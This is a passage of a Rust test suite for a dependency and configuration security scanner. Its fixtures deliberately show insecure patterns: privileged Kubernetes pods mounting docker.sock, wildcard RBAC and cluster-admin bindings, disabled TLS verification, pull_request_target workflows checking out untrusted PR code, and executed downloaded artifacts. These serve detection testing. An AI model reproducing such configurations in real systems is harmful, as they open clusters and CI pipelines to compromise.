            "source \"https://rubygems.org\"\ngem \"corp-utils-api\", source: \"https://mirror.example.com\"\n",
        )]);
        context.config.ruby_source_ownership = vec!["gems.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.ruby.manifest.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_ruby_manifest_direct_source_owner_bypass_on_expected_host() {
        let (mut context, root) = test_context(&[(
            "Gemfile",
            "source \"https://rubygems.org\"\ngem \"corp-utils-api\", git: \"https://github.com/example/corp-utils-api.git\"\n",
        )]);
        context.config.ruby_source_ownership = vec!["github.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.ruby.manifest.direct-source-owner-bypass"
                && finding.detail.contains("github.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_ruby_lockfile_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "Gemfile.lock",
            "GEM\n  remote: https://mirror.example.com/\n  specs:\n    corp-utils-api (1.2.3)\n",
        )]);
        context.config.ruby_source_ownership = vec!["gems.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.ruby.lockfile.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn accepts_ruby_lockfile_when_resolved_host_matches_owner_rule() {
        let (mut context, root) = test_context(&[(
            "Gemfile.lock",
            "GEM\n  remote: https://gems.example.com/\n  specs:\n    corp-utils-api (1.2.3)\n",
        )]);
        context.config.ruby_source_ownership = vec!["gems.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings
            .iter()
            .any(|finding| { finding.id == "dependency.ruby.lockfile.ownership-host-mismatch" }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_missing_ruby_lockfile_when_dependency_snapshot_changes() {
        let (context, root) = test_context(&[(
            "Gemfile",
            "source \"https://rubygems.org\"\ngem \"rails\", \"7.1.3\"\n",
        )]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "dependency.lockfile.missing.ruby"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pyproject_custom_indexes_and_uv_lock_sources() {
        let (context, root) = test_context(&[
            (
                "pyproject.toml",
                "[project]\ndependencies = [\n  \"requests @ https://packages.example.com/requests-2.32.0.tar.gz\",\n]\n\n[[tool.poetry.source]]\nname = \"internal\"\nurl = \"https://packages.example.com/simple\"\n\n[tool.uv]\nallow-insecure-host = [\"packages.example.com\"]\n",
            ),
            (
                "uv.lock",
                "[[package]]\nname = \"requests\"\nversion = \"2.32.0\"\nsource = { registry = \"http://packages.example.com/simple\" }\n\n[[package]]\nname = \"private-sdk\"\nversion = \"1.0.0\"\nsource = { git = \"https://github.com/example/private-sdk\", rev = \"abcdef123456\" }\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings
            .iter()
            .any(|finding| finding.id == "dependency.lockfile.missing.python"));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Python project config defines a custom package index")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Python dependency uses a direct archive or local source")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Python project config allows insecure package hosts")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("uv lockfile contains a Git-sourced package")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("uv lockfile contains an insecure HTTP source")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_requirements_index_and_transport_overrides() {
        let (context, root) = test_context(&[(
            "requirements.txt",
            "--extra-index-url https://packages.example.com/simple\n--trusted-host packages.example.com\n--find-links https://packages.example.com/wheels\nprivate-sdk @ https://packages.example.com/private-sdk-1.0.0.tar.gz\nrequests==2.32.0\n",
        )]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("requirements file adds an extra package index")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("requirements file trusts a package host")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("requirements file uses an out-of-band package link source")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("requirements file uses a direct remote package source")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pipfile_and_pipfile_lock_provenance_changes() {
        let (context, root) = test_context(&[
            (
                "Pipfile",
                "[[source]]\nurl = \"https://packages.example.com/simple\"\nverify_ssl = false\nname = \"internal\"\n\n[packages]\nprivate-sdk = { git = \"https://github.com/example/private-sdk.git\" }\nrequests = \"*\"\n",
            ),
            (
                "Pipfile.lock",
                "{\n  \"default\": {\n    \"requests\": {\n      \"version\": \"==2.32.0\",\n      \"index\": \"internal\"\n    },\n    \"private-sdk\": {\n      \"git\": \"https://github.com/example/private-sdk.git\",\n      \"ref\": \"abcdef1234567890\"\n    }\n  },\n  \"develop\": {}\n}\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings
            .iter()
            .any(|finding| finding.id == "dependency.lockfile.missing.python"));
        assert!(findings.iter().any(|finding| finding
            .title
            .contains("Pipfile defines a custom package index")));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Pipfile disables package source TLS verification")
        }));
        assert!(findings.iter().any(|finding| finding
            .title
            .contains("Pipfile uses a direct dependency source")));
        assert!(findings.iter().any(|finding| finding
            .title
            .contains("Pipfile.lock contains a Git-sourced package")));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Pipfile.lock resolves packages from a custom package index")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_kubernetes_secret_manifests_with_inline_data() {
        let (context, root) = test_context(&[(
            "k8s/secret.yaml",
            "apiVersion: v1\nkind: Secret\nmetadata:\n  name: app-secret\nstringData:\n  DATABASE_URL: postgres://prod.example.internal/app\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Kubernetes Secret manifest with inline data")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_kubernetes_rbac_wildcards_and_cluster_admin_bindings() {
        let (context, root) = test_context(&[
            (
                "k8s/rbac.yaml",
                "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: broad\nrules:\n  - apiGroups: [\"*\"]\n    resources: [\"*\"]\n    verbs: [\"*\"]\n",
            ),
            (
                "k8s/binding.yaml",
                "apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: give-admin\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n  - kind: ServiceAccount\n    name: deployer\n",
            ),
        ]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("RBAC manifest uses wildcard permissions")
        }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("binding grants cluster-admin") }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_kubernetes_privileged_runtime_posture() {
        let (context, root) = test_context(&[(
            "k8s/deploy.yaml",
            "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  template:\n    spec:\n      hostNetwork: true\n      containers:\n        - name: api\n          image: registry.example.com/api:latest\n          securityContext:\n            privileged: true\n            allowPrivilegeEscalation: true\n            runAsNonRoot: false\n      volumes:\n        - name: socket\n          hostPath:\n            path: /var/run/docker.sock\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("enables privileged container mode") }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("allows privilege escalation") }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("allows running as root") }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("shares a host namespace") }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("mounts a hostPath volume") }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_kubernetes_ingress_with_tls_redirect_disabled() {
        let (context, root) = test_context(&[(
            "k8s/ingress.yaml",
            "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: public-app\n  annotations:\n    nginx.ingress.kubernetes.io/ssl-redirect: \"false\"\nspec:\n  rules:\n    - host: app.example.com\n      http:\n        paths:\n          - path: /\n            pathType: Prefix\n            backend:\n              service:\n                name: app\n                port:\n                  number: 80\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.id == "config.kubernetes.ingress-tls-redirect-disabled" }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_kubernetes_ingress_sensitive_paths_without_allowlist() {
        let (context, root) = test_context(&[(
            "k8s/ingress.yaml",
            "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: metrics\nspec:\n  rules:\n    - host: metrics.example.com\n      http:\n        paths:\n          - path: /metrics\n            pathType: Prefix\n            backend:\n              service:\n                name: metrics\n                port:\n                  number: 9090\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.kubernetes.ingress-sensitive-path"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_kubernetes_ingress_sensitive_paths_with_allowlist_annotation() {
        let (context, root) = test_context(&[(
            "k8s/ingress.yaml",
            "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: metrics\n  annotations:\n    nginx.ingress.kubernetes.io/whitelist-source-range: 10.0.0.0/8\nspec:\n  rules:\n    - host: metrics.example.com\n      http:\n        paths:\n          - path: /metrics\n            pathType: Prefix\n            backend:\n              service:\n                name: metrics\n                port:\n                  number: 9090\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.kubernetes.ingress-sensitive-path"),
            "expected no ingress-sensitive-path finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_kubernetes_namespace_with_privileged_pod_security_enforcement() {
        let (context, root) = test_context(&[(
            "k8s/namespace.yaml",
            "apiVersion: v1\nkind: Namespace\nmetadata:\n  name: workloads\n  labels:\n    pod-security.kubernetes.io/enforce: privileged\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.kubernetes.pod-security-privileged"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_kubernetes_admission_webhooks_that_fail_open() {
        let (context, root) = test_context(&[(
            "k8s/webhook.yaml",
            "apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingWebhookConfiguration\nmetadata:\n  name: policy\nwebhooks:\n  - name: policy.example.com\n    failurePolicy: Ignore\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.id == "config.kubernetes.admission-webhook-failure-ignore" }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_kubernetes_admission_webhooks_that_fail_closed() {
        let (context, root) = test_context(&[(
            "k8s/webhook.yaml",
            "apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingWebhookConfiguration\nmetadata:\n  name: policy\nwebhooks:\n  - name: policy.example.com\n    failurePolicy: Fail\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.kubernetes.admission-webhook-failure-ignore"),
            "expected no admission-webhook-failure-ignore finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_github_actions_write_all_permissions() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    branches: [main]\npermissions: write-all\njobs:\n  release:\n    runs-on: ubuntu-latest\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("GitHub Actions workflow grants write-all token permissions")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pull_request_target_head_references() {
        let (context, root) = test_context(&[(
            ".github/workflows/pr-target.yml",
            "name: pr-target\non:\n  pull_request_target:\n    types: [opened]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("GitHub Actions pull_request_target workflow detected")
                && finding.severity == Severity::High
                && finding.confidence == Confidence::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_unpinned_third_party_actions() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    branches: [main]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: vendor/security-scan-action@v2\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("mutable third-party action reference")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pull_request_self_hosted_runners() {
        let (context, root) = test_context(&[(
            ".github/workflows/pr.yml",
            "name: pr\non:\n  pull_request:\n    branches: [main]\njobs:\n  test:\n    runs-on: [self-hosted, linux]\n    steps:\n      - run: cargo test\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("workflow uses a self-hosted runner") }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_github_actions_secrets_inherit_and_unsecure_commands() {
        let (context, root) = test_context(&[(
            ".github/workflows/reusable.yml",
            "name: reusable\non:\n  workflow_call:\njobs:\n  privileged:\n    runs-on: ubuntu-latest\n    env:\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n    steps:\n      - uses: org/reusable-build@3f4c2d1e5a6b7c8d9e0f1234567890abcdef1234\n        with:\n          target: prod\n        secrets: inherit\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("inherits all caller secrets")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("enables unsecure commands")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_unpinned_reusable_workflow_references() {
        let (context, root) = test_context(&[(
            ".github/workflows/deploy.yml",
            "name: deploy\non:\n  workflow_dispatch:\njobs:\n  publish:\n    uses: org/platform/.github/workflows/reusable-deploy.yml@v3\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("mutable reusable workflow reference")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_artifact_download_and_execution_chains() {
        let (context, root) = test_context(&[(
            ".github/workflows/promote.yml",
            "name: promote\non:\n  workflow_run:\n    workflows: [build]\n    types: [completed]\njobs:\n  promote:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: release-bundle\n          path: artifacts/release\n      - run: chmod +x artifacts/release/deploy.sh && ./artifacts/release/deploy.sh\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("workflow_run trigger detected")));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("downloads artifacts and appears to execute them")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_dispatch_controlled_checkout_refs() {
        let (context, root) = test_context(&[(
            ".github/workflows/manual-release.yml",
            "name: manual-release\non:\n  workflow_dispatch:\n    inputs:\n      ref:\n        required: true\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.inputs.ref }}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Dispatch-triggered workflow checks out a caller-controlled ref")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_release_target_commitish_checkouts() {
        let (context, root) = test_context(&[(
            ".github/workflows/release-build.yml",
            "name: release-build\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.release.target_commitish }}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Release workflow checks out release target ref dynamically")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_branch_push_release_workflows_that_publish() {
        let (context, root) = test_context(&[(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n    branches: [main]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: cargo publish --token ${{ secrets.CARGO_TOKEN }}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("publishes artifacts from a mutable branch push")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("lacks explicit provenance or signing signals")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_branch_push_release_action_workflows_as_publish_paths() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    branches: [main]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: softprops/action-gh-release@v2\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("publishes artifacts from a mutable branch push")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("lacks explicit provenance or signing signals")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_branch_push_goreleaser_action_workflows_as_publish_paths() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    branches: [main]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: goreleaser/goreleaser-action@v6\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("publishes artifacts from a mutable branch push")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("lacks explicit provenance or signing signals")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_branch_push_semantic_release_action_workflows_as_publish_paths() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    branches: [main]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: cycjimmy/semantic-release-action@v4\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("publishes artifacts from a mutable branch push")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("lacks explicit provenance or signing signals")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_publish_workflows_with_explicit_provenance_signals() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - run: npm publish\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings.iter().all(|finding| !finding
                .title
                .contains("lacks explicit provenance or signing signals")),
            "expected no provenance-gap finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_semantic_release_action_workflows_with_attestation_signals() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: cycjimmy/semantic-release-action@v4\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.github-actions.publish-without-provenance"),
            "expected no provenance-gap finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_goreleaser_action_workflows_with_attestation_signals() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: goreleaser/goreleaser-action@v6\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.github-actions.publish-without-provenance"),
            "expected no provenance-gap finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_release_action_workflows_with_attestation_signals() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: softprops/action-gh-release@v2\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.github-actions.publish-without-provenance"),
            "expected no provenance-gap finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_release_workflows_using_long_lived_release_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: softprops/action-gh-release@v2\n        with:\n          github_token: ${{ secrets.GH_PAT }}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("release workflow relies on long-lived release credentials")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_goreleaser_action_workflows_using_long_lived_release_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    env:\n      GITHUB_TOKEN: ${{ secrets.GH_PAT }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: goreleaser/goreleaser-action@v6\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("release workflow relies on long-lived release credentials")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_semantic_release_action_workflows_using_long_lived_release_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    env:\n      GITHUB_TOKEN: ${{ secrets.GH_PAT }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: cycjimmy/semantic-release-action@v4\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("release workflow relies on long-lived release credentials")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_release_workflows_using_ephemeral_repository_token() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: write\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: softprops/action-gh-release@v2\n        with:\n          github_token: ${{ github.token }}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.github-actions.release-long-lived-credential"),
            "expected no release-long-lived-credential finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_semantic_release_action_workflows_using_ephemeral_repository_token() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: write\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    env:\n      GITHUB_TOKEN: ${{ github.token }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: cycjimmy/semantic-release-action@v4\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.github-actions.release-long-lived-credential"),
            "expected no release-long-lived-credential finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_goreleaser_action_workflows_using_ephemeral_repository_token() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: write\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    env:\n      GITHUB_TOKEN: ${{ github.token }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - uses: goreleaser/goreleaser-action@v6\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.github-actions.release-long-lived-credential"),
            "expected no release-long-lived-credential finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_publish_attestation_steps_without_required_permissions() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: read\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - run: npm publish\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("attestation step lacks required token permissions")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_publish_workflows_using_long_lived_registry_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    env:\n      NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - run: npm publish --provenance\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("publish workflow relies on long-lived registry credentials")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn treats_trusted_publishing_as_release_provenance_signal() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
